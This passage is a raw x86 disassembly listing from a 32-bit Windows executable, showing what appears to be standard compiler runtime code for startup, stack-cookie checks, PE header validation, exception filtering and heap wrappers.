  4070f3:	mov    ebp,esp
  4070f5:	test   BYTE PTR [ebp+0x8],0x1
  4070f9:	push   esi
  4070fa:	mov    esi,ecx
  4070fc:	mov    DWORD PTR [esi],0x4013a8
  407102:	je     0x40710b
  407104:	push   esi
  407105:	call   0x407458
  40710a:	pop    ecx
  40710b:	mov    eax,esi
  40710d:	pop    esi
  40710e:	pop    ebp
  40710f:	ret    0x4
  407112:	int3   
  407113:	int3   
  407114:	int3   
  407115:	int3   
  407116:	int3   
  407117:	cmp    BYTE PTR [ecx+0x8],0x0
  40711b:	mov    DWORD PTR [ecx],0x4013c0
  407121:	je     0x407132
  407123:	cmp    DWORD PTR [ecx+0x4],0x0
  407127:	je     0x407132
  407129:	push   DWORD PTR [ecx+0x4]
  40712c:	call   DWORD PTR ds:0x40a07c
  407132:	ret    
  407133:	int3   
  407134:	int3   
  407135:	int3   
  407136:	int3   
  407137:	int3   
  407138:	int3   
  407139:	int3   
  40713a:	int3   
  40713b:	int3   
  40713c:	int3   
  40713d:	int3   
  40713e:	int3   
  40713f:	int3   
  407140:	mov    edi,edi
  407142:	push   ebp
  407143:	mov    ebp,esp
  407145:	push   DWORD PTR [ebp+0x8]
  407148:	push   0x0
  40714a:	push   DWORD PTR [ecx+0x4]
  40714d:	call   DWORD PTR ds:0x40a11c
  407153:	pop    ebp
  407154:	ret    0x4
  407157:	int3   
  407158:	int3   
  407159:	int3   
  40715a:	int3   
  40715b:	int3   
  40715c:	int3   
  40715d:	int3   
  40715e:	int3   
  40715f:	int3   
  407160:	mov    edi,edi
  407162:	push   ebp
  407163:	mov    ebp,esp
  407165:	cmp    DWORD PTR [ebp+0x8],0x0
  407169:	je     0x407179
  40716b:	push   DWORD PTR [ebp+0x8]
  40716e:	push   0x0
  407170:	push   DWORD PTR [ecx+0x4]
  407173:	call   DWORD PTR ds:0x40a0bc
  407179:	pop    ebp
  40717a:	ret    0x4
  40717d:	int3   
  40717e:	int3   
  40717f:	int3   
  407180:	int3   
  407181:	int3   
  407182:	int3   
  407183:	int3   
  407184:	int3   
  407185:	int3   
  407186:	int3   
  407187:	int3   
  407188:	int3   
  407189:	int3   
  40718a:	int3   
  40718b:	int3   
  40718c:	int3   
  40718d:	int3   
  40718e:	int3   
  40718f:	int3   
  407190:	mov    edi,edi
  407192:	push   ebp
  407193:	mov    ebp,esp
  407195:	mov    eax,DWORD PTR [ebp+0x8]
  407198:	test   eax,eax
  40719a:	jne    0x4071ab
  40719c:	push   DWORD PTR [ebp+0xc]
  40719f:	push   eax
  4071a0:	push   DWORD PTR [ecx+0x4]
  4071a3:	call   DWORD PTR ds:0x40a11c
  4071a9:	jmp    0x4071d0
  4071ab:	cmp    DWORD PTR [ebp+0xc],0x0
  4071af:	jne    0x4071c1
  4071b1:	push   eax
  4071b2:	push   0x0
  4071b4:	push   DWORD PTR [ecx+0x4]
  4071b7:	call   DWORD PTR ds:0x40a0bc
  4071bd:	xor    eax,eax
  4071bf:	jmp    0x4071d0
  4071c1:	push   DWORD PTR [ebp+0xc]
  4071c4:	push   eax
  4071c5:	push   0x0
  4071c7:	push   DWORD PTR [ecx+0x4]
  4071ca:	call   DWORD PTR ds:0x40a080
  4071d0:	pop    ebp
  4071d1:	ret    0x8
  4071d4:	int3   
  4071d5:	int3   
  4071d6:	int3   
  4071d7:	int3   
  4071d8:	int3   
  4071d9:	int3   
  4071da:	int3   
  4071db:	int3   
  4071dc:	int3   
  4071dd:	int3   
  4071de:	int3   
  4071df:	int3   
  4071e0:	mov    edi,edi
  4071e2:	push   ebp
  4071e3:	mov    ebp,esp
  4071e5:	push   DWORD PTR [ebp+0x8]
  4071e8:	push   0x0
  4071ea:	push   DWORD PTR [ecx+0x4]
  4071ed:	call   DWORD PTR ds:0x40a084
  4071f3:	pop    ebp
  4071f4:	ret    0x4
  4071f7:	int3   
  4071f8:	int3   
  4071f9:	int3   
  4071fa:	int3   
  4071fb:	int3   
  4071fc:	int3   
  4071fd:	int3   
  4071fe:	int3   
  4071ff:	int3   
  407200:	mov    edi,edi
  407202:	push   ebp
  407203:	mov    ebp,esp
  407205:	push   esi
  407206:	mov    esi,ecx
  407208:	call   0x407117
  40720d:	test   BYTE PTR [ebp+0x8],0x1
  407211:	je     0x40721a
  407213:	push   esi
  407214:	call   0x407458
  407219:	pop    ecx
  40721a:	mov    eax,esi
  40721c:	pop    esi
  40721d:	pop    ebp
  40721e:	ret    0x4
  407221:	int3   
  407222:	int3   
  407223:	int3   
  407224:	int3   
  407225:	int3   
  407226:	mov    edi,edi
  407228:	push   esi
  407229:	push   edi
  40722a:	push   0x18
  40722c:	xor    esi,esi
  40722e:	mov    edi,0x4097a8
  407233:	push   esi
  407234:	push   edi
  407235:	call   DWORD PTR ds:0x40a1a0
  40723b:	add    esp,0xc
  40723e:	mov    DWORD PTR ds:0x4097c0,esi
  407244:	mov    eax,0x400000
  407249:	mov    DWORD PTR ds:0x4097c4,esi
  40724f:	mov    ecx,edi
  407251:	mov    DWORD PTR ds:0x4097c8,esi
  407257:	mov    DWORD PTR ds:0x409790,0x3c
  407261:	mov    ds:0x409798,eax
  407266:	mov    ds:0x409794,eax
  40726b:	mov    BYTE PTR ds:0x40979c,0x1
  407272:	mov    DWORD PTR ds:0x4097a0,0x800
  40727c:	mov    DWORD PTR ds:0x4097a4,0x401cd8
  407286:	call   0x40740c
  40728b:	pop    edi
  40728c:	pop    esi
  40728d:	test   eax,eax
  40728f:	jns    0x407298
  407291:	mov    BYTE PTR ds:0x4097fc,0x1
  407298:	mov    eax,0x409790
  40729d:	ret    
  40729e:	int3   
  40729f:	int3   
  4072a0:	int3   
  4072a1:	int3   
  4072a2:	int3   
  4072a3:	mov    eax,ds:0x4097c0
  4072a8:	test   eax,eax
  4072aa:	je     0x4072ba
  4072ac:	push   eax
  4072ad:	call   0x407766
  4072b2:	and    DWORD PTR ds:0x4097c0,0x0
  4072b9:	pop    ecx
  4072ba:	and    DWORD PTR ds:0x4097c4,0x0
  4072c1:	and    DWORD PTR ds:0x4097c8,0x0
  4072c8:	ret    
  4072c9:	int3   
  4072ca:	int3   
  4072cb:	int3   
  4072cc:	int3   
  4072cd:	int3   
  4072ce:	mov    edi,edi
  4072d0:	push   ebx
  4072d1:	mov    ebx,esp
  4072d3:	push   ecx
  4072d4:	push   ecx
  4072d5:	and    esp,0xfffffff8
  4072d8:	add    esp,0x4
  4072db:	push   ebp
  4072dc:	mov    ebp,DWORD PTR [ebx+0x4]
  4072df:	mov    DWORD PTR [esp+0x4],ebp
  4072e3:	mov    ebp,esp
  4072e5:	push   esi
  4072e6:	push   edi
  4072e7:	mov    edi,0x4097a8
  4072ec:	push   edi
  4072ed:	call   DWORD PTR ds:0x40a06c
  4072f3:	mov    ecx,DWORD PTR [ebx+0x8]
  4072f6:	mov    eax,ds:0x4097c4
  4072fb:	cmp    ecx,eax
  4072fd:	jg     0x40731b
  4072ff:	test   ecx,ecx
  407301:	js     0x40731b
  407303:	cmp    ecx,eax
  407305:	jne    0x40730f
  407307:	mov    esi,DWORD PTR ds:0x409798
  40730d:	jmp    0x40731d
  40730f:	jge    0x407331
  407311:	mov    eax,ds:0x4097c0
  407316:	mov    esi,DWORD PTR [eax+ecx*4]
  407319:	jmp    0x40731d
  40731b:	xor    esi,esi
  40731d:	push   edi
  40731e:	call   DWORD PTR ds:0x40a068
  407324:	pop    edi
  407325:	mov    eax,esi
  407327:	pop    esi
  407328:	mov    esp,ebp
  40732a:	pop    ebp
  40732b:	mov    esp,ebx
  40732d:	pop    ebx
  40732e:	ret    0x4
  407331:	call   0x4073f5
  407336:	int3   
  407337:	int3   
  407338:	int3   
  407339:	int3   
  40733a:	int3   
  40733b:	int3   
  40733c:	mov    eax,ds:0x4097d0
  407341:	push   edi
  407342:	mov    edi,edx
  407344:	test   eax,eax
  407346:	je     0x4073bb
  407348:	cmp    eax,0x2c
  40734b:	je     0x407354
  40734d:	mov    eax,0x80070057
  407352:	pop    edi
  407353:	ret    
  407354:	mov    eax,ds:0x4097f4
  407359:	push   esi
  40735a:	xor    esi,esi
  40735c:	test   eax,eax
  40735e:	jle    0x407383
  407360:	test   esi,esi
  407362:	js     0x4073bf
  407364:	cmp    esi,eax
  407366:	jge    0x4073bf
  407368:	mov    eax,ds:0x4097f0
  40736d:	push   edi
  40736e:	movzx  eax,WORD PTR [eax+esi*2]
  407372:	push   eax
  407373:	call   DWORD PTR ds:0x40a15c
  407379:	mov    eax,ds:0x4097f4
  40737e:	inc    esi
  40737f:	cmp    esi,eax
  407381:	jl     0x407360
  407383:	mov    eax,ds:0x4097f0
  407388:	pop    esi
  407389:	test   eax,eax
  40738b:	je     0x40739b
  40738d:	push   eax
  40738e:	call   0x407766
  407393:	and    DWORD PTR ds:0x4097f0,0x0
  40739a:	pop    ecx
  40739b:	and    DWORD PTR ds:0x4097f4,0x0
  4073a2:	and    DWORD PTR ds:0x4097f8,0x0
  4073a9:	push   0x4097d4
  4073ae:	call   DWORD PTR ds:0x40a074
  4073b4:	and    DWORD PTR ds:0x4097d0,0x0
  4073bb:	xor    eax,eax
  4073bd:	pop    edi
  4073be:	ret    
  4073bf:	call   0x4073f5
  4073c4:	int3   
  4073c5:	int3   
  4073c6:	int3   
  4073c7:	int3   
  4073c8:	int3   
  4073c9:	int3   
  4073ca:	mov    eax,ds:0x4097f0
  4073cf:	test   eax,eax
  4073d1:	je     0x4073e1
  4073d3:	push   eax
  4073d4:	call   0x407766
  4073d9:	and    DWORD PTR ds:0x4097f0,0x0
  4073e0:	pop    ecx
  4073e1:	and    DWORD PTR ds:0x4097f4,0x0
  4073e8:	and    DWORD PTR ds:0x4097f8,0x0
  4073ef:	ret    
  4073f0:	int3   
  4073f1:	int3   
  4073f2:	int3   
  4073f3:	int3   
  4073f4:	int3   
  4073f5:	push   0x0
  4073f7:	push   0x0
  4073f9:	push   0x1
  4073fb:	push   0xc000008c
  407400:	call   DWORD PTR ds:0x40a070
  407406:	ret    
  407407:	int3   
  407408:	int3   
  407409:	int3   
  40740a:	int3   
  40740b:	int3   
  40740c:	push   0xc
  40740e:	push   0x408cf8
  407413:	call   0x407d74
  407418:	xor    esi,esi
  40741a:	mov    DWORD PTR [ebp-0x4],esi
  40741d:	push   ecx
  40741e:	call   DWORD PTR ds:0x40a078
  407424:	jmp    0x407441
  407426:	mov    eax,DWORD PTR [ebp-0x14]
  407429:	mov    eax,DWORD PTR [eax]
  40742b:	xor    ecx,ecx
  40742d:	cmp    DWORD PTR [eax],0xc0000017
  407433:	sete   cl
  407436:	mov    eax,ecx
  407438:	ret    
  407439:	mov    esp,DWORD PTR [ebp-0x18]
  40743c:	mov    esi,0x8007000e
  407441:	mov    DWORD PTR [ebp-0x1c],esi
  407444:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40744b:	mov    eax,esi
  40744d:	call   0x407db9
  407452:	ret    
  407453:	int3   
  407454:	int3   
  407455:	int3   
  407456:	int3   
  407457:	int3   
  407458:	jmp    0x407766
  40745d:	int3   
  40745e:	int3   
  40745f:	int3   
  407460:	int3   
  407461:	int3   
  407462:	int3   
  407463:	int3   
  407464:	int3   
  407465:	int3   
  407466:	int3   
  407467:	int3   
  407468:	int3   
  407469:	int3   
  40746a:	int3   
  40746b:	int3   
  40746c:	int3   
  40746d:	int3   
  40746e:	int3   
  40746f:	int3   
  407470:	mov    eax,0x5a4d
  407475:	cmp    WORD PTR ds:0x400000,ax
  40747c:	je     0x407482
  40747e:	xor    eax,eax
  407480:	jmp    0x4074d0
  407482:	mov    ecx,DWORD PTR ds:0x40003c
  407488:	cmp    DWORD PTR [ecx+0x400000],0x4550
  407492:	jne    0x40747e
  407494:	movzx  eax,WORD PTR [ecx+0x400018]
  40749b:	cmp    eax,0x10b
  4074a0:	je     0x4074bc
  4074a2:	cmp    eax,0x20b
  4074a7:	jne    0x40747e
  4074a9:	xor    eax,eax
  4074ab:	cmp    DWORD PTR [ecx+0x400084],0xe
  4074b2:	jbe    0x4074d0
  4074b4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  4074ba:	jmp    0x4074cd
  4074bc:	xor    eax,eax
  4074be:	cmp    DWORD PTR [ecx+0x400074],0xe
  4074c5:	jbe    0x4074d0
  4074c7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  4074cd:	setne  al
  4074d0:	push   0x1
  4074d2:	mov    ds:0x409418,eax
  4074d7:	call   0x4079ae
  4074dc:	push   eax
  4074dd:	call   DWORD PTR ds:0x40a1cc
  4074e3:	or     DWORD PTR ds:0x40980c,0xffffffff
  4074ea:	or     DWORD PTR ds:0x409810,0xffffffff
  4074f1:	pop    ecx
  4074f2:	pop    ecx
  4074f3:	call   DWORD PTR ds:0x40a1bc
  4074f9:	mov    ecx,DWORD PTR ds:0x409748
  4074ff:	mov    DWORD PTR [eax],ecx
  407501:	call   DWORD PTR ds:0x40a1d8
  407507:	mov    ecx,DWORD PTR ds:0x40973c
  40750d:	mov    DWORD PTR [eax],ecx
  40750f:	call   0x407a00
  407514:	cmp    DWORD PTR ds:0x409000,0x0
  40751b:	jne    0x407529
  40751d:	push   0x407a00
  407522:	call   DWORD PTR ds:0x40a1b8
  407528:	pop    ecx
  407529:	call   0x407c0f
  40752e:	xor    eax,eax
  407530:	ret    
  407531:	int3   
  407532:	int3   
  407533:	int3   
  407534:	int3   
  407535:	int3   
  407536:	int3   
  407537:	int3   
  407538:	int3   
  407539:	int3   
  40753a:	int3   
  40753b:	int3   
  40753c:	int3   
  40753d:	int3   
  40753e:	int3   
  40753f:	int3   
  407540:	mov    eax,ds:0x409744
  407545:	push   0x40941c
  40754a:	push   DWORD PTR ds:0x409740
  407550:	mov    ds:0x40941c,eax
  407555:	push   0x409410
  40755a:	push   0x40940c
  40755f:	push   0x409408
  407564:	call   DWORD PTR ds:0x40a1d0
  40756a:	add    esp,0x14
  40756d:	mov    ds:0x409414,eax
  407572:	ret    
  407573:	int3   
  407574:	int3   
  407575:	int3   
  407576:	int3   
  407577:	int3   
  407578:	push   0x10
  40757a:	push   0x408d18
  40757f:	call   0x407c34
  407584:	xor    ebx,ebx
  407586:	mov    DWORD PTR [ebp-0x4],ebx
  407589:	mov    eax,fs:0x18
  40758f:	mov    esi,DWORD PTR [eax+0x4]
  407592:	mov    edi,ebx
  407594:	mov    edx,0x409814
  407599:	mov    ecx,esi
  40759b:	xor    eax,eax
  40759d:	lock cmpxchg DWORD PTR [edx],ecx
  4075a1:	test   eax,eax
  4075a3:	je     0x4075bd
  4075a5:	cmp    eax,esi
  4075a7:	jne    0x4075b0
  4075a9:	xor    esi,esi
  4075ab:	inc    esi
  4075ac:	mov    edi,esi
  4075ae:	jmp    0x4075c0
  4075b0:	push   0x3e8
  4075b5:	call   DWORD PTR ds:0x40a060
  4075bb:	jmp    0x407594
  4075bd:	xor    esi,esi
  4075bf:	inc    esi
  4075c0:	cmp    DWORD PTR ds:0x409818,esi
  4075c6:	jne    0x4075d2
  4075c8:	push   0x1f
  4075ca:	call   0x4079ea
  4075cf:	pop    ecx
  4075d0:	jmp    0x40760c
  4075d2:	cmp    DWORD PTR ds:0x409818,ebx
  4075d8:	jne    0x407606
  4075da:	mov    DWORD PTR ds:0x409818,esi
  4075e0:	push   0x401028
  4075e5:	push   0x40101c
  4075ea:	call   0x4076ec
  4075ef:	pop    ecx
  4075f0:	pop    ecx
  4075f1:	test   eax,eax
  4075f3:	je     0x40760c
  4075f5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4075fc:	mov    eax,0xff
  407601:	jmp    0x4076e1
  407606:	mov    DWORD PTR ds:0x409404,esi
  40760c:	cmp    DWORD PTR ds:0x409818,esi
  407612:	jne    0x40762f
  407614:	push   0x401018
  407619:	push   0x401000
  40761e:	call   0x407c28
  407623:	pop    ecx
  407624:	pop    ecx
  407625:	mov    DWORD PTR ds:0x409818,0x2
  40762f:	test   edi,edi
  407631:	jne    0x40763c
  407633:	xor    eax,eax
  407635:	mov    ecx,0x409814
  40763a:	xchg   DWORD PTR [ecx],eax
  40763c:	cmp    DWORD PTR ds:0x40981c,0x0
  407643:	je     0x407668
  407645:	push   0x40981c
  40764a:	call   0x407a60
  40764f:	pop    ecx
  407650:	test   eax,eax
  407652:	je     0x407668
  407654:	push   ebx
  407655:	push   0x2
  407657:	push   ebx
  407658:	mov    esi,DWORD PTR ds:0x40981c
  40765e:	mov    ecx,esi
  407660:	call   DWORD PTR ds:0x40a20c
  407666:	call   esi
  407668:	push   DWORD PTR ds:0x409410
  40766e:	push   DWORD PTR ds:0x40940c
  407674:	push   DWORD PTR ds:0x409408
  40767a:	call   0x4028b4
  40767f:	add    esp,0xc
  407682:	mov    ds:0x409400,eax
  407687:	cmp    DWORD PTR ds:0x409418,0x0
  40768e:	jne    0x4076c6
  407690:	push   eax
  407691:	call   DWORD PTR ds:0x40a1c8
  407697:	mov    ecx,DWORD PTR [ebp-0x14]
  40769a:	mov    eax,DWORD PTR [ecx]
  40769c:	mov    eax,DWORD PTR [eax]
  40769e:	mov    DWORD PTR [ebp-0x20],eax
  4076a1:	push   ecx
  4076a2:	push   eax
  4076a3:	call   0x407934
  4076a8:	pop    ecx
  4076a9:	pop    ecx
  4076aa:	ret    
  4076ab:	mov    esp,DWORD PTR [ebp-0x18]
  4076ae:	mov    eax,DWORD PTR [ebp-0x20]
  4076b1:	mov    ds:0x409400,eax
  4076b6:	cmp    DWORD PTR ds:0x409418,0x0
  4076bd:	jne    0x4076c6
  4076bf:	push   eax
  4076c0:	call   DWORD PTR ds:0x40a1c4
  4076c6:	cmp    DWORD PTR ds:0x409404,0x0
  4076cd:	jne    0x4076da
  4076cf:	call   DWORD PTR ds:0x40a1c0
  4076d5:	mov    eax,ds:0x409400
  4076da:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4076e1:	call   0x407c7c
  4076e6:	ret    
  4076e7:	int3   
  4076e8:	int3   
  4076e9:	int3   
  4076ea:	int3   
  4076eb:	int3   
  4076ec:	mov    edi,edi
  4076ee:	push   ebp
  4076ef:	mov    ebp,esp
  4076f1:	push   ecx
  4076f2:	mov    eax,ds:0x409004
  4076f7:	xor    eax,ebp
  4076f9:	mov    DWORD PTR [ebp-0x4],eax
  4076fc:	push   esi
  4076fd:	mov    esi,DWORD PTR [ebp+0x8]
  407700:	xor    eax,eax
  407702:	cmp    esi,DWORD PTR [ebp+0xc]
  407705:	jae    0x407725
  407707:	push   edi
  407708:	test   eax,eax
  40770a:	jne    0x407724
  40770c:	mov    edi,DWORD PTR [esi]
  40770e:	test   edi,edi
  407710:	je     0x40771c
  407712:	mov    ecx,edi
  407714:	call   DWORD PTR ds:0x40a20c
  40771a:	call   edi
  40771c:	add    esi,0x4
  40771f:	cmp    esi,DWORD PTR [ebp+0xc]
  407722:	jb     0x407708
  407724:	pop    edi
  407725:	mov    ecx,DWORD PTR [ebp-0x4]
  407728:	xor    ecx,ebp
  40772a:	pop    esi
  40772b:	call   0x407750
  407730:	mov    esp,ebp
  407732:	pop    ebp
  407733:	ret    
  407734:	int3   
  407735:	int3   
  407736:	int3   
  407737:	int3   
  407738:	int3   
  407739:	int3   
  40773a:	int3   
  40773b:	int3   
  40773c:	int3   
  40773d:	int3   
  40773e:	int3   
  40773f:	int3   
  407740:	call   0x407b68
  407745:	jmp    0x407578
  40774a:	int3   
  40774b:	int3   
  40774c:	int3   
  40774d:	int3   
  40774e:	int3   
  40774f:	int3   
  407750:	cmp    ecx,DWORD PTR ds:0x409004
  407756:	jne    0x40775b
  407758:	ret    0x0
  40775b:	jmp    0x4077ac
  407760:	int3   
  407761:	int3   
  407762:	int3   
  407763:	int3   
  407764:	int3   
  407765:	int3   
  407766:	jmp    DWORD PTR ds:0x40a1e8
  40776c:	int3   
  40776d:	int3   
  40776e:	int3   
  40776f:	int3   
  407770:	int3   
  407771:	int3   
  407772:	jmp    DWORD PTR ds:0x40a1e4
  407778:	int3   
  407779:	int3   
  40777a:	int3   
  40777b:	int3   
  40777c:	int3   
  40777d:	mov    edi,edi
  40777f:	push   ebp
  407780:	mov    ebp,esp
  407782:	push   0x0
  407784:	call   DWORD PTR ds:0x40a0d0
  40778a:	push   DWORD PTR [ebp+0x8]
  40778d:	call   DWORD PTR ds:0x40a0cc
  407793:	push   0xc0000409
  407798:	call   DWORD PTR ds:0x40a0d4
  40779e:	push   eax
  40779f:	call   DWORD PTR ds:0x40a0d8
  4077a5:	pop    ebp
  4077a6:	ret    
  4077a7:	int3   
  4077a8:	int3   
  4077a9:	int3   
  4077aa:	int3   
  4077ab:	int3   
  4077ac:	mov    edi,edi
  4077ae:	push   ebp
  4077af:	mov    ebp,esp
  4077b1:	sub    esp,0x324
  4077b7:	mov    ds:0x409520,eax
  4077bc:	mov    DWORD PTR ds:0x40951c,ecx
  4077c2:	mov    DWORD PTR ds:0x409518,edx
  4077c8:	mov    DWORD PTR ds:0x409514,ebx
  4077ce:	mov    DWORD PTR ds:0x409510,esi
  4077d4:	mov    DWORD PTR ds:0x40950c,edi
  4077da:	data16 mov WORD PTR ds:0x409538,ss
  4077e1:	data16 mov WORD PTR ds:0x40952c,cs
  4077e8:	data16 mov WORD PTR ds:0x409508,ds
  4077ef:	data16 mov WORD PTR ds:0x409504,es
  4077f6:	data16 mov WORD PTR ds:0x409500,fs
  4077fd:	data16 mov WORD PTR ds:0x4094fc,gs
  407804:	pushf  
  407805:	pop    DWORD PTR ds:0x409530
  40780b:	mov    eax,DWORD PTR [ebp+0x0]
  40780e:	mov    ds:0x409524,eax
  407813:	mov    eax,DWORD PTR [ebp+0x4]
  407816:	mov    ds:0x409528,eax
  40781b:	lea    eax,[ebp+0x8]
  40781e:	mov    ds:0x409534,eax
  407823:	mov    eax,DWORD PTR [ebp-0x324]
  407829:	mov    DWORD PTR ds:0x409470,0x10001
  407833:	mov    eax,ds:0x409528
  407838:	mov    ds:0x40942c,eax
  40783d:	mov    DWORD PTR ds:0x409420,0xc0000409
  407847:	mov    DWORD PTR ds:0x409424,0x1
  407851:	mov    DWORD PTR ds:0x409430,0x3
  40785b:	push   0x4
  40785d:	pop    eax
  40785e:	imul   eax,eax,0x0
  407861:	mov    DWORD PTR [eax+0x409434],0x2
  40786b:	push   0x4
  40786d:	pop    eax
  40786e:	shl    eax,0x0
  407871:	mov    ecx,DWORD PTR ds:0x409004
  407877:	mov    DWORD PTR [eax+0x409434],ecx
  40787d:	push   0x4
  40787f:	pop    eax
  407880:	shl    eax,1
  407882:	mov    ecx,DWORD PTR ds:0x409008
  407888:	mov    DWORD PTR [eax+0x409434],ecx
  40788e:	push   0x4
  407890:	pop    eax
  407891:	imul   eax,eax,0x0
  407894:	mov    ecx,DWORD PTR ds:0x409004
  40789a:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40789e:	push   0x4
  4078a0:	pop    eax
  4078a1:	shl    eax,0x0
  4078a4:	mov    ecx,DWORD PTR ds:0x409008
  4078aa:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4078ae:	push   0x4010b0
  4078b3:	call   0x40777d
  4078b8:	mov    esp,ebp
  4078ba:	pop    ebp
  4078bb:	ret    
  4078bc:	int3   
  4078bd:	int3   
  4078be:	int3   
  4078bf:	int3   
  4078c0:	int3   
  4078c1:	int3   
  4078c2:	int3   
  4078c3:	int3   
  4078c4:	int3   
  4078c5:	int3   
  4078c6:	int3   
  4078c7:	int3   
  4078c8:	int3   
  4078c9:	int3   
  4078ca:	int3   
  4078cb:	int3   
  4078cc:	int3   
  4078cd:	int3   
  4078ce:	int3   
  4078cf:	int3   
  4078d0:	mov    edi,edi
  4078d2:	push   ebp
  4078d3:	mov    ebp,esp
  4078d5:	mov    eax,DWORD PTR [ebp+0x8]
  4078d8:	mov    eax,DWORD PTR [eax]
  4078da:	cmp    DWORD PTR [eax],0xe06d7363
  4078e0:	jne    0x40790d
  4078e2:	cmp    DWORD PTR [eax+0x10],0x3
  4078e6:	jne    0x40790d
  4078e8:	mov    eax,DWORD PTR [eax+0x14]
  4078eb:	cmp    eax,0x19930520
  4078f0:	je     0x407907
  4078f2:	cmp    eax,0x19930521
  4078f7:	je     0x407907
  4078f9:	cmp    eax,0x19930522
  4078fe:	je     0x407907
  407900:	cmp    eax,0x1994000
  407905:	jne    0x40790d
  407907:	call   DWORD PTR ds:0x40a170
  40790d:	xor    eax,eax
  40790f:	pop    ebp
  407910:	ret    0x4
  407913:	int3   
  407914:	int3   
  407915:	int3   
  407916:	int3   
  407917:	int3   
  407918:	int3   
  407919:	int3   
  40791a:	int3   
  40791b:	int3   
  40791c:	int3   
  40791d:	int3   
  40791e:	int3   
  40791f:	int3   
  407920:	push   0x4078d0
  407925:	call   DWORD PTR ds:0x40a0d0
  40792b:	xor    eax,eax
  40792d:	ret    
  40792e:	int3   
  40792f:	int3   
  407930:	int3   
  407931:	int3   
  407932:	int3   
  407933:	int3   
  407934:	jmp    DWORD PTR ds:0x40a1dc
  40793a:	int3   
  40793b:	int3   
  40793c:	int3   
  40793d:	int3   
  40793e:	int3   
  40793f:	push   0xc
  407941:	push   0x408d38
  407946:	call   0x407d74
  40794b:	xor    ecx,ecx
  40794d:	mov    eax,DWORD PTR [ebp+0x8]
  407950:	test   eax,eax
  407952:	je     0x40799f
  407954:	cmp    eax,0xffffffff
  407957:	je     0x40799f
  407959:	mov    DWORD PTR [ebp-0x4],ecx
  40795c:	mov    edx,0x5a4d
  407961:	cmp    WORD PTR [eax],dx
  407964:	jne    0x407998
  407966:	mov    edx,DWORD PTR [eax+0x3c]
  407969:	test   edx,edx
  40796b:	js     0x407998
  40796d:	cmp    edx,0x10000000
  407973:	jae    0x407998
  407975:	add    eax,edx
  407977:	mov    DWORD PTR [ebp-0x1c],eax
  40797a:	mov    ecx,DWORD PTR [eax]
  40797c:	sub    ecx,0x4550
  407982:	neg    ecx
  407984:	sbb    ecx,ecx
  407986:	not    ecx
  407988:	and    ecx,eax
  40798a:	jmp    0x407995
  40798c:	xor    eax,eax
  40798e:	inc    eax
  40798f:	ret    
  407990:	mov    esp,DWORD PTR [ebp-0x18]
  407993:	xor    ecx,ecx
  407995:	mov    DWORD PTR [ebp-0x1c],ecx
  407998:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40799f:	mov    eax,ecx
  4079a1:	call   0x407db9
  4079a6:	ret    0x4
  4079a9:	int3   
  4079aa:	int3   
  4079ab:	int3   
  4079ac:	int3   
  4079ad:	int3   
  4079ae:	mov    edi,edi
  4079b0:	push   ebp
  4079b1:	mov    ebp,esp
  4079b3:	push   0x0
  4079b5:	call   DWORD PTR ds:0x40a0dc
  4079bb:	test   eax,eax
  4079bd:	je     0x4079df
  4079bf:	push   eax
  4079c0:	call   0x40793f
  4079c5:	test   eax,eax
  4079c7:	je     0x4079df
  4079c9:	movzx  ecx,WORD PTR [eax+0x5c]
  4079cd:	push   0x2
  4079cf:	pop    eax
  4079d0:	cmp    cx,ax
  4079d3:	je     0x4079e2
  4079d5:	cmp    ecx,0x3
  4079d8:	jne    0x4079df
  4079da:	xor    eax,eax
  4079dc:	inc    eax
  4079dd:	pop    ebp
  4079de:	ret    
  4079df:	mov    eax,DWORD PTR [ebp+0x8]
  4079e2:	pop    ebp
  4079e3:	ret    
  4079e4:	int3   
  4079e5:	int3   
  4079e6:	int3   
  4079e7:	int3   
  4079e8:	int3   
  4079e9:	int3   
  4079ea:	jmp    DWORD PTR ds:0x40a1d4
  4079f0:	int3   
  4079f1:	int3   
  4079f2:	int3   
  4079f3:	int3   
  4079f4:	int3   
  4079f5:	int3   
  4079f6:	int3   
  4079f7:	int3   
  4079f8:	int3   
  4079f9:	int3   
  4079fa:	int3   
  4079fb:	int3   
  4079fc:	int3   
  4079fd:	int3   
  4079fe:	int3   
  4079ff:	int3   
  407a00:	xor    eax,eax
  407a02:	ret    
  407a03:	int3   
  407a04:	int3   
  407a05:	int3   
  407a06:	int3   
  407a07:	int3   
  407a08:	int3   
  407a09:	int3   
  407a0a:	int3   
  407a0b:	int3   
  407a0c:	int3   
  407a0d:	int3   
  407a0e:	int3   
  407a0f:	int3   
  407a10:	mov    edi,edi
  407a12:	push   ebp
  407a13:	mov    ebp,esp
  407a15:	mov    eax,DWORD PTR [ebp+0x8]
  407a18:	xor    edx,edx
  407a1a:	push   ebx
  407a1b:	push   esi
  407a1c:	push   edi
  407a1d:	mov    ecx,DWORD PTR [eax+0x3c]
  407a20:	add    ecx,eax
  407a22:	movzx  eax,WORD PTR [ecx+0x14]
  407a26:	movzx  ebx,WORD PTR [ecx+0x6]
  407a2a:	add    eax,0x18
  407a2d:	add    eax,ecx
  407a2f:	test   ebx,ebx
  407a31:	je     0x407a4e
  407a33:	mov    edi,DWORD PTR [ebp+0xc]
  407a36:	mov    esi,DWORD PTR [eax+0xc]
  407a39:	cmp    edi,esi
  407a3b:	jb     0x407a46
  407a3d:	mov    ecx,DWORD PTR [eax+0x8]
  407a40:	add    ecx,esi
  407a42:	cmp    edi,ecx
  407a44:	jb     0x407a50
  407a46:	inc    edx
  407a47:	add    eax,0x28
  407a4a:	cmp    edx,ebx
  407a4c:	jb     0x407a36
  407a4e:	xor    eax,eax
  407a50:	pop    edi
  407a51:	pop    esi
  407a52:	pop    ebx
  407a53:	pop    ebp
  407a54:	ret    
  407a55:	int3   
  407a56:	int3   
  407a57:	int3   
  407a58:	int3   
  407a59:	int3   
  407a5a:	int3   
  407a5b:	int3   
  407a5c:	int3   
  407a5d:	int3   
  407a5e:	int3   
  407a5f:	int3   
  407a60:	mov    edi,edi
  407a62:	push   ebp
  407a63:	mov    ebp,esp
  407a65:	push   0xfffffffe
  407a67:	push   0x408d58
  407a6c:	push   0x407c90
  407a71:	mov    eax,fs:0x0
  407a77:	push   eax
